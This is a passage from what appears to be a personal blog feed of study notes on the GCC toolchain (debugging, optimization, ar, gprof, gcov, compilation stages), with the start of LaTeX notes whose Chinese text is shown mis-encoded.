class="hljs ini"><span class="hljs-attr">-DNAME</span>=<span class="hljs-string">&quot;\&quot;Hello, World!\&quot;&quot;</span><br></code></pre></td></tr></table></figure><h2 id="4-3-Preprocessing-source-files"><a href="#4-3-Preprocessing-source-files" class="headerlink" title="4.3 Preprocessing source files"></a>4.3 Preprocessing source files</h2><p>To see the effect of the preprocessor on source file directly, using the <code>-E</code> option.</p><p><code>-save-temps</code> option, the preprocessed output will be available in the file <code>hello.i</code>.</p><h1 id="5-Compiling-for-debugging"><a href="#5-Compiling-for-debugging" class="headerlink" title="5 Compiling for debugging"></a>5 Compiling for debugging</h1><p><code>-g</code> option to store additional debugging information in object files and executables.</p><p>GNU Debugger gdb.</p><p>Storing the names of functions and variables, with their corresponding source code line-numbers.</p><h2 id="5-1-Examining-core-files"><a href="#5-1-Examining-core-files" class="headerlink" title="5.1 Examining core files"></a>5.1 Examining core files</h2><p>The core file can be used to find the line where the program stopped, and the values of its variables at that point.</p><p>A null pointer will only cause a problem at run-time, so the option <code>-Wall</code> does not produce any warning.</p><p>Whenever the error message <code>core dumped</code> is displayed, the operating system should produce a file called <code>core</code> in the current directory.</p><p>The term <code>segmentation fault</code> refers to the fact that the program tried to access a restricted memory <code>segment</code> outside the area of memory which had been allocated to it.</p><p>In the GNU Bash shell the command <code>ulimit -c</code> control the maximum size of core files.</p><p>Any size to be written:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ulimit</span> -c unlimited</span><br></code></pre></td></tr></table></figure><p>only apply to the current shell.</p><p>Loading the core file into the GNU Debugger gdb:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span> gdb EXEECUTABLE-<span class="hljs-keyword">FILE</span> CORE-<span class="hljs-keyword">FILE</span><br></code></pre></td></tr></table></figure><p>both the original executable file and the core file are required for debugging.</p><h1 id="6-Compiling-with-optimization"><a href="#6-Compiling-with-optimization" class="headerlink" title="6 Compiling with optimization"></a>6 Compiling with optimization</h1><h2 id="6-1-Source-level-optimization"><a href="#6-1-Source-level-optimization" class="headerlink" title="6.1 Source-level optimization"></a>6.1 Source-level optimization</h2><p>Two type:</p><pre><code class="hljs">- common subexpression elimination- function inlining</code></pre><h3 id="6-1-1-Common-subexpression-elimination"><a href="#6-1-1-Common-subexpression-elimination" class="headerlink" title="6.1.1 Common subexpression elimination"></a>6.1.1 Common subexpression elimination</h3><p>Reusing already-computed results.<br>å¦‚:</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs lisp">x = cos(<span class="hljs-name">v</span>)*(<span class="hljs-number">1</span>+sin(<span class="hljs-name">u/2</span>)) + sin(<span class="hljs-name">w</span>)*(<span class="hljs-number">1</span>-sin(<span class="hljs-name">u/2</span>))<br></code></pre></td></tr></table></figure><p>é‡å†™ä¸º:</p><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs excel"><span class="hljs-built_in">t</span> = <span class="hljs-built_in">sin</span>(u/<span class="hljs-number">2</span>);<br>x = <span class="hljs-built_in">cos</span>(v)*(<span class="hljs-number">1</span>+<span class="hljs-built_in">t</span>) + <span class="hljs-built_in">sin</span>(w)*(<span class="hljs-number">1</span>-<span class="hljs-built_in">t</span>);<br></code></pre></td></tr></table></figure><p>å¯ä»¥ increase the speed and reduces the size of the code.</p><h3 id="6-1-2-Function-inlining"><a href="#6-1-2-Function-inlining" class="headerlink" title="6.1.2 Function inlining"></a>6.1.2 Function inlining</h3><p>Increase the efficiency of frequently-called functions.</p><p>Replacing calls to a function by the code of the function itself.</p><p>Eliminating the function call.</p><p>The function being suitably small.</p><h2 id="6-2-Speed-space-tradeoffs"><a href="#6-2-Speed-space-tradeoffs" class="headerlink" title="6.2 Speed-space tradeoffs"></a>6.2 Speed-space tradeoffs</h2><p>Choose between speed and memory is referred to as speed-space tradeoffs.</p><h3 id="6-2-1-Loop-unrolling"><a href="#6-2-1-Loop-unrolling" class="headerlink" title="6.2.1 Loop unrolling"></a>6.2.1 Loop unrolling</h3><p>å°†å¾ªç¯æ‹†å¼€ï¼Œè¿™æ ·å¯ä»¥å‡å°‘æµ‹è¯•çš„æ—¶é—´:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for(i <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 8; i++) &#123;</span><br>  y[i] <span class="hljs-operator">=</span> i<span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>æ”¹ä¸º:</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs abnf">y[<span class="hljs-number">0</span>] <span class="hljs-operator">=</span> <span class="hljs-number">0</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">1</span>] <span class="hljs-operator">=</span> <span class="hljs-number">1</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">2</span>] <span class="hljs-operator">=</span> <span class="hljs-number">2</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">3</span>] <span class="hljs-operator">=</span> <span class="hljs-number">3</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">4</span>] <span class="hljs-operator">=</span> <span class="hljs-number">4</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">5</span>] <span class="hljs-operator">=</span> <span class="hljs-number">5</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">6</span>] <span class="hljs-operator">=</span> <span class="hljs-number">6</span><span class="hljs-comment">;</span><br>y[<span class="hljs-number">7</span>] <span class="hljs-operator">=</span> <span class="hljs-number">7</span><span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><h2 id="6-3-Scheduling"><a href="#6-3-Scheduling" class="headerlink" title="6.3 Scheduling"></a>6.3 Scheduling</h2><p>The results become available to later instructions at the right time.</p><h2 id="6-4-Optimization-levels"><a href="#6-4-Optimization-levels" class="headerlink" title="6.4 Optimization levels"></a>6.4 Optimization levels</h2><p>Numbered from 0-3.</p><p>The command line option <code>-oLEVEL</code>.</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-string">&#x27;-o0&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">no</span> <span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-keyword">default</span>: <span class="hljs-keyword">perform</span> <span class="hljs-keyword">no</span> optimization.<br><br> <span class="hljs-string">&#x27;-o1&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-keyword">do</span> <span class="hljs-keyword">not</span> require <span class="hljs-keyword">any</span> speed-space tradeoffs, smaller <span class="hljs-keyword">and</span> faster than <span class="hljs-keyword">with</span> <span class="hljs-string">&#x27;-o0&#x27;</span><br><br> <span class="hljs-string">&#x27;-o2&#x27;</span>, it provide maximum optimization <span class="hljs-keyword">without</span> increasing the executable size.<br><br> <span class="hljs-string">&#x27;-o3&#x27;</span>, may increase the speed but increase the size.<br><br> <span class="hljs-string">&#x27;-funroll-loops&#x27;</span>, turns <span class="hljs-keyword">on</span> <span class="hljs-keyword">loop</span>-unrolling.<br><br> <span class="hljs-string">&#x27;-os&#x27;</span>, produce the smallest possible executable.<br></code></pre></td></tr></table></figure><p>The cost of optimization includes greater complexity in debugging, and increased time and memory requirements during compilation.</p><h2 id="6-5-Examples"><a href="#6-5-Examples" class="headerlink" title="6.5 Examples"></a>6.5 Examples</h2><p>The run-time of the program can be measured using the <code>time</code> command in the GNU Bash shell.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>time ./a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><p>Optimizations may not necessarity make a program faster in every case.</p><h2 id="6-6-Optimization-and-debugging"><a href="#6-6-Optimization-and-debugging" class="headerlink" title="6.6 Optimization and debugging"></a>6.6 Optimization and debugging</h2><h2 id="6-7-Optimization-and-compiler-warning"><a href="#6-7-Optimization-and-compiler-warning" class="headerlink" title="6.7 Optimization and compiler warning"></a>6.7 Optimization and compiler warning</h2><p><code>-Wall</code> åº”è¯¥çœ‹æˆï¼Œ<code>-W</code> å’Œ <code>all</code>.</p><h1 id="7-Compiling-a-C-program"><a href="#7-Compiling-a-C-program" class="headerlink" title="7 Compiling a C++ program"></a>7 Compiling a C++ program</h1><p>It compiles C++ source code directly into assembly language.</p><h2 id="7-1-Compiling-a-simple-C-program"><a href="#7-1-Compiling-a-simple-C-program" class="headerlink" title="7.1 Compiling a simple C++ program"></a>7.1 Compiling a simple C++ program</h2><p>Using <code>g++</code> instead of <code>gcc</code>.<br>p56</p><h1 id="9-Troubleshooting"><a href="#9-Troubleshooting" class="headerlink" title="9 Troubleshooting"></a>9 Troubleshooting</h1><p>To display a complete list of options for gcc and its associated program:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">gcc -v --<span class="hljs-built_in">help</span></span><br></code></pre></td></tr></table></figure><h1 id="10-Compiler-related-tools"><a href="#10-Compiler-related-tools" class="headerlink" title="10 Compiler-related tools"></a>10 Compiler-related tools</h1><p>GNU archiver <mark>ar</mark>, for creating libaries, and the GNU profiling and coverage testing programs, <mark>gprof</mark> and <mark>gcov</mark>.</p><h2 id="10-1-Creating-a-library-with-the-GNU-archiver"><a href="#10-1-Creating-a-library-with-the-GNU-archiver" class="headerlink" title="10.1 Creating a library with the GNU archiver"></a>10.1 Creating a library with the GNU archiver</h2><p>Combining a collection of object files into a single archive file.</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">$ ar <span class="hljs-literal">cr</span> libhello.<span class="hljs-keyword">a</span> hello_fn.o bye_fn.o<br></code></pre></td></tr></table></figure><p>The option <code>cr</code> stands for â€œcreate and replaceâ€. ar does not require a prefix â€˜-â€˜ for its options.</p><p>The first argument â€˜libhello.aâ€™ is the name of the library, The remaining arguments are the name of the object files to be copied into the library.</p><p>option <code>t</code>, list the object file in an existing library:</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs stylus">$ ar t libhello<span class="hljs-selector-class">.a</span><br>hello_fn<span class="hljs-selector-class">.o</span><br>bye_fn.o<br></code></pre></td></tr></table></figure><h2 id="10-2-Using-the-profiler-gprof"><a href="#10-2-Using-the-profiler-gprof" class="headerlink" title="10.2 Using the profiler gprof"></a>10.2 Using the profiler gprof</h2><p>Measuring the performance of a program.</p><p>To use profiling, the program must be compiled and linked with the <code>-pg</code> profiling option:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall -c -pg collatz.c<br><span class="hljs-variable">$ </span>gcc -Wall -pg collatz.o<br></code></pre></td></tr></table></figure><p>If the program consists of more than one source file then the â€˜-pgâ€™ option should be used when compiling each source file, and used again when linking the object files to create the final executable.</p><p>The executable must be run to create the profiling data:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>./a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><h2 id="10-3-Converage-testing-with-gcov"><a href="#10-3-Converage-testing-with-gcov" class="headerlink" title="10.3 Converage testing with gcov"></a>10.3 Converage testing with gcov</h2><p>It analyses the number of times each line of a program is executed during a run.</p><p>To find areas of the code which are not used, or which are not exercised in testing.</p><h1 id="11-How-the-compiler-works"><a href="#11-How-the-compiler-works" class="headerlink" title="11 How the compiler works"></a>11 How the compiler works</h1><p>The GNU Compiler, gcc or g++.</p><p>The GNU Assembler, as.</p><p>The GNU Linker, ld.</p><h2 id="11-1-An-overview-of-the-compilation-process"><a href="#11-1-An-overview-of-the-compilation-process" class="headerlink" title="11.1 An overview of the compilation process"></a>11.1 An overview of the compilation process</h2><p>The following stages:</p><pre><code class="hljs">- preprocessing (to expand macros)- compilation (from source code to assembly language)- assembly (from assembly language to machine code)- linking (to create the final executable)</code></pre><p>Can be seen using the â€˜-vâ€™ option described earlier.</p><h2 id="11-2-The-preprocessor"><a href="#11-2-The-preprocessor" class="headerlink" title="11.2 The preprocessor"></a>11.2 The preprocessor</h2><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-variable">$</span> <span class="hljs-built_in">cpp</span> hello.c &gt; hello.i<br></code></pre></td></tr></table></figure><h2 id="11-3-The-compiler"><a href="#11-3-The-compiler" class="headerlink" title="11.3 The compiler"></a>11.3 The compiler</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc -Wall -S hello.i<br></code></pre></td></tr></table></figure><h2 id="11-4-The-assembler"><a href="#11-4-The-assembler" class="headerlink" title="11.4 The assembler"></a>11.4 The assembler</h2><p>Convert assembly language into machine code and generate an object file.</p><p>When there are calls to external functions in the assembly source file, the assembler leaves the addresses of the external functions undefined.</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span><span class="hljs-keyword">as</span> hello.s -o hello.o<br></code></pre></td></tr></table></figure><h2 id="11-5-The-linker"><a href="#11-5-The-linker" class="headerlink" title="11.5 The linker"></a>11.5 The linker</h2><p>The linking of object files to create an executable.</p><p>The entire linking process is handled transparently by gcc when invoked as follows:</p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>gcc hello.o<br></code></pre></td></tr></table></figure><h1 id="12-Examining-compiled-files"><a href="#12-Examining-compiled-files" class="headerlink" title="12 Examining compiled files"></a>12 Examining compiled files</h1><h2 id="12-1-Identifying-files"><a href="#12-1-Identifying-files" class="headerlink" title="12.1 Identifying files"></a>12.1 Identifying files</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>file a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><h2 id="12-2-Examining-the-symble-table"><a href="#12-2-Examining-the-symble-table" class="headerlink" title="12.2 Examining the symble table"></a>12.2 Examining the symble table</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>nm a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure><h2 id="12-3-Finding-dynamically-linked-libraries"><a href="#12-3-Finding-dynamically-linked-libraries" class="headerlink" title="12.3 Finding dynamically linked libraries"></a>12.3 Finding dynamically linked libraries</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs crystal"><span class="hljs-variable">$ </span>ldd a.<span class="hljs-keyword">out</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>GCC</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>Adding something to man page</title>
    <link href="/2022/07/22/Adding-something-to-man-page/"/>
    <url>/2022/07/22/Adding-something-to-man-page/</url>
    
    <content type="html"><![CDATA[<p>Adding things into &#x2F;usr&#x2F;local&#x2F;man.</p>]]></content>
    
    
    <categories>
      
      <category>Skills</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>LaTexå…¥é—¨</title>
    <link href="/2022/07/21/LaTeX%E5%85%A5%E9%97%A8/"/>
    <url>/2022/07/21/LaTeX%E5%85%A5%E9%97%A8/</url>
    
    <content type="html"><![CDATA[<h1 id="ç¬¬ä¸€ç« -ç†Ÿæ‚‰LaTec"><a href="#ç¬¬ä¸€ç« -ç†Ÿæ‚‰LaTec" class="headerlink" title="ç¬¬ä¸€ç«  ç†Ÿæ‚‰LaTec"></a>ç¬¬ä¸€ç«  ç†Ÿæ‚‰LaTec</h1><p><code>\documentclass&#123;article&#125;</code>å£°æ˜æ–‡æ¡£çš„ç±»å‹æ˜¯<code>article</code>.</p><p><code>\begin&#123;document&#125;</code>å’Œ<code>\end&#123;document&#125;</code>æ ‡è¯†å‡ºæ­£æ–‡çš„èŒƒå›´ã€‚</p><p>ä½¿ç”¨<code>\documentclass[UTF8]&#123;ctexart&#125;</code>å¯æ˜¾ç¤ºä¸­æ–‡ã€‚</p><p><code>\section&#123;&#125;</code>å£°æ˜äº†ä¸€èŠ‚çš„æ ‡é¢˜.</p><p><code>\[</code>å’Œ<code>\]</code>åŒ…è£¹çš„æ•°å­¦å…¬å¼ã€‚</p><p>LATAXçš„å‘½ä»¤ä»¥åæ–œçº¿<code>\</code>å¼€å¤´ã€‚</p><p>ä¸¥æ ¼æ¥è¯´, LaTexä¸æ˜¯æ ‡è®°è¯­è¨€ï¼Œè€Œæ˜¯ä¸»è¦åŸºäºå­—ç¬¦ä¸²ä»£æ¢çš„å®è¯­è¨€ã€‚</p><h2 id="1-2-ä»ä¸€ä¸ªä¾‹å­è¯´èµ·"><a href="#1-2-ä»ä¸€ä¸ªä¾‹å­è¯´èµ·" class="headerlink" title="1.2 ä»ä¸€ä¸ªä¾‹å­è¯´èµ·"></a>1.2 ä»ä¸€ä¸ªä¾‹å­è¯´èµ·</h2><h3 id="1-2-2-ä»æçº²å¼€å§‹"><a href="#1-2-2-ä»æçº²å¼€å§‹" class="headerlink" title="1.2.2 ä»æçº²å¼€å§‹"></a>1.2.2 ä»æçº²å¼€å§‹</h3><p><code>%</code>å¼€å¤´çš„æ˜¯æ³¨é‡Šã€‚</p><p>å•ä¸ªæ¢è¡Œå¹¶ä¸ä¼šä½¿æ–‡å­—å¦èµ·ä¸€æ®µã€‚</p><p>LaTexä¼šå¿½ç•¥æ¯è¡Œå¼€å§‹çš„æ‰€æœ‰ç©ºæ ¼ã€‚</p><p><code>\footnote&#123;&#125;</code>è„šæ³¨å‘½ä»¤ã€‚èŠ±æ‹¬å·å†…çš„éƒ¨åˆ†æ˜¯å‘½ä»¤çš„å‚æ•°ï¼Œä¹Ÿå°±æ˜¯è„šæ³¨çš„å†…å®¹ã€‚</p><p><code>emph</code>å‘½ä»¤æ”¹å˜å­—ä½“å½¢çŠ¶ï¼Œè¡¨ç¤ºå¼ºè°ƒã€‚</p><p><code>quote</code>ç¯å¢ƒï¼Œä»¥<code>\begin&#123;quote&#125;</code>å’Œ<code>\end&#123;quote&#125;</code>ä¸ºèµ·æ­¢ä½ç½®ã€‚</p><p><code>begin&#123;&#125;</code>å‘½ä»¤çš„å‚æ•°æ˜¯ç¯å¢ƒï¼Ÿ</p><p><code>abstract</code>ç¯å¢ƒï¼Œ<code>begin&#123;abstract&#125;</code>.</p><p>åˆ†ç»„é™å®šäº†å£°æ˜çš„ä½œç”¨èŒƒå›´ï¼Œä¸€ä¸ªLaTexç¯å¢ƒè‡ªç„¶å°±æ˜¯ä¸€ä¸ªåˆ†ç»„ã€‚</p><p>LaTexç¯å¢ƒçš„ä¸€èˆ¬æ ¼å¼:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">\<span class="hljs-keyword">begin</span>&#123;ç¯å¢ƒå&#125;<br>...<br>\<span class="hljs-keyword">end</span>&#123;ç¯å¢ƒå&#125;<br></code></pre></td></tr></table></figure><p>å¸¦å‚æ•°æˆ–å¯é€‰å‚æ•°çš„ç¯å¢ƒ:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">\<span class="hljs-keyword">begin</span>&#123;ç¯å¢ƒå&#125;[å¯é€‰å‚æ•°]å…¶ä»–å‚æ•°<br>...<br>\<span class="hljs-keyword">end</span>&#123;ç¯å¢ƒå&#125;<br></code></pre></td></tr></table></figure><p>å®šç†ç¯å¢ƒï¼Œæ˜¯ä¸€ç±»ç¯å¢ƒï¼Œéœ€åœ¨å¯¼è¨€åŒºåšå®šä¹‰:</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\newtheorem</span><span class="hljs-template-variable">&#123;thm&#125;</span><span class="hljs-template-variable">&#123;å®šç†&#125;</span><br></code></pre></td></tr></table></figure><p>æœ€åä¸€ä¸ªèŠ±æ‹¬å·<code>&#123;&#125;</code>æ˜¯å¯é€‰å‚æ•°ï¼Œä¹Ÿå°±æ˜¯åå­—ã€‚</p><p>ä½¿ç”¨:</p><figure class="highlight erlang"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs erlang">\<span class="hljs-keyword">begin</span>&#123;thm&#125;[å‹¾è‚¡å®šç†]<br>...<br>\<span class="hljs-keyword">end</span>&#123;thm&#125;<br></code></pre></td></tr></table></figure><h3 id="1-2-5-é­é‡æ•°å­¦å…¬å¼"><a href="#1-2-5-é­é‡æ•°å­¦å…¬å¼" class="headerlink" title="1.2.5 é­é‡æ•°å­¦å…¬å¼"></a>1.2.5 é­é‡æ•°å­¦å…¬å¼</h3><p>æœ€ç®€å•çš„æ–¹æ³•, ä½¿ç”¨<code>$...$</code>:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-meta"><span class="hljs-keyword">$a</span>+b$</span><br></code></pre></td></tr></table></figure><p>ç§°<code>è¡Œå†…å…¬å¼(inline formula)</code>.</p><p>â€œåˆ—è¡¨å…¬å¼â€ä½¿ç”¨<code>equation</code>ç¯å¢ƒ:</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs llvm">\<span class="hljs-keyword">begin</span>&#123;equation&#125;<br>  a(b+<span class="hljs-keyword">c</span>) <span class="hljs-operator">=</span> ab + ac<br>\<span class="hljs-keyword">end</span>&#123;equantion&#125;<br></code></pre></td></tr></table></figure><p>é”®ç›˜ä¸Šæ²¡æœ‰çš„ç¬¦å·éœ€è¦ä½¿ç”¨å‘½ä»¤æ¥è¾“å…¥ã€‚</p><p>ä¸Šæ ‡ç»“æ„:</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">AB</span>^<span class="hljs-number">2</span><br></code></pre></td></tr></table></figure><p>ä¸‹æ ‡ç»“æ„:</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs">AB_2<br></code></pre></td></tr></table></figure><p>å‚æ•°æ˜¯å¤šä¸ªå­—ç¬¦å°±æ˜¯ç”¨èŠ±æ‹¬å·<code>&#123;&#125;</code>.</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">2</span>^&#123;<span class="hljs-number">10</span>&#125;<br></code></pre></td></tr></table></figure><p>è§’åº¦çš„ç¬¦å·ä½¿ç”¨ä¸Šæ ‡è¡¨ç¤º:</p><figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs gams"><span class="hljs-symbol">$</span>^\circ<span class="hljs-symbol">$</span><br></code></pre></td></tr></table></figure><h3 id="1-2-6-ä½¿ç”¨å›¾è¡¨"><a href="#1-2-6-ä½¿ç”¨å›¾è¡¨" class="headerlink" title="1.2.6 ä½¿ç”¨å›¾è¡¨"></a>1.2.6 ä½¿ç”¨å›¾è¡¨</h3><h4 id="æ’å›¾"><a href="#æ’å›¾" class="headerlink" title="æ’å›¾"></a>æ’å›¾</h4><p>ä¸¤ç§æ–¹å¼:</p><pre><code class="hljs">1. æ’å…¥äº‹å…ˆå‡†å¤‡å¥½çš„å›¾ç‰‡2. ä½¿ç”¨LaTexä»£ç ç›´æ¥åœ¨æ–‡æ¡£ä¸­ç”»å›¾</code></pre><p>å¤§éƒ¨åˆ†æƒ…å†µéƒ½æ˜¯ä½¿ç”¨æ’å…¥å¤–éƒ¨å›¾ç‰‡çš„æ–¹å¼ã€‚</p><p>ä½¿ç”¨<code>\usepackage</code>å¼•å…¥å®åŒ…, æ’å…¥å›¾ç‰‡ä½¿ç”¨<code>graphicx</code>å®åŒ…ã€‚</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">\usepackage</span><span class="hljs-template-variable">&#123;graphicx&#125;</span><br></code></pre></td></tr></table></figure><p><code>figure</code>ç¯å¢ƒï¼Œå³æµ®åŠ¨ä½“ç¯å¢ƒã€‚</p><h4 id="è¡¨æ ¼"><a href="#è¡¨æ ¼" class="headerlink" title="è¡¨æ ¼"></a>è¡¨æ ¼</h4><p>ä½¿ç”¨<code>tabular</code>ç¯å¢ƒç¡®å®šè¡¨æ ¼çš„è¡Œã€åˆ—å¯¹é½æ¨¡å¼å’Œè¡¨æ ¼çº¿ã€‚</p><p><code>tabular</code>ç¯å¢ƒæœ‰ä¸€ä¸ªå‚æ•°ã€‚</p><h3 id="1-2-7-è‡ªåŠ¨åŒ–å·¥å…·"><a href="#1-2-7-è‡ªåŠ¨åŒ–å·¥å…·" class="headerlink" title="1.2.7 è‡ªåŠ¨åŒ–å·¥å…·"></a>1.2.7 è‡ªåŠ¨åŒ–å·¥å…·</h3><p>ä½¿ç”¨<code>\bibliographystyle</code>å£°æ˜å‚è€ƒæ–‡çŒ®çš„æ ¼å¼ã€‚</p><p>ä½¿ç”¨<code>\bibliography</code>å‘½ä»¤è¦æ±‚æ‰“å°å‡ºå‚è€ƒæ–‡çŒ®åˆ—è¡¨.</p><p>ä½¿ç”¨<code>BIBTEX</code>å¤„ç†å‚è€ƒæ•°æ®åº“ï¼Œå³<code>.bib</code>æ–‡ä»¶ï¼š</p><figure class="highlight dust"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs dust"><span class="language-xml">@ARTICLE</span><span class="hljs-template-variable">&#123;quanjing,</span><br><span class="hljs-template-variable">  author = &#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  publisher = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  title = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  journal = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  year = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  volume = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml">,</span><br><span class="language-xml">  number = </span><span class="hljs-template-variable">&#123;&#125;</span><span class="language-xml"></span><br><span class="language-xml">&#125;</span><br></code></pre></td></tr></table></figure><p><code>BIBTEX</code>æ˜¯ä¸€ä¸ªä¸“ç”¨äºå¤„ç†LATEXæ–‡æ¡£æ–‡çŒ®åˆ—è¡¨çš„ç¨‹åºã€‚</p><p>å¼•ç”¨æ–‡çŒ®çš„æ–¹æ³•:</p><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">\<span class="hljs-selector-tag">cite</span>&#123;name&#125;<br></code></pre></td></tr></table></figure><p>ç”¨<code>lable</code>å®šä¹‰çš„æ ‡ç­¾ä¹Ÿèƒ½è¢«å¼•ç”¨ã€‚</p><h1 id="ç¬¬äºŒç« -ç»„ç»‡ä½ çš„æ–‡æœ¬"><a href="#ç¬¬äºŒç« -ç»„ç»‡ä½ çš„æ–‡æœ¬" class="headerlink" title="ç¬¬äºŒç«  ç»„ç»‡ä½ çš„æ–‡æœ¬"></a>ç¬¬äºŒç«  ç»„ç»‡ä½ çš„æ–‡æœ¬</h1><h2 id="2-1-æ–‡å­—ä¸ç¬¦å·"><a href="#2-1-æ–‡å­—ä¸ç¬¦å·" class="headerlink" title="2.1 æ–‡å­—ä¸ç¬¦å·"></a>2.1 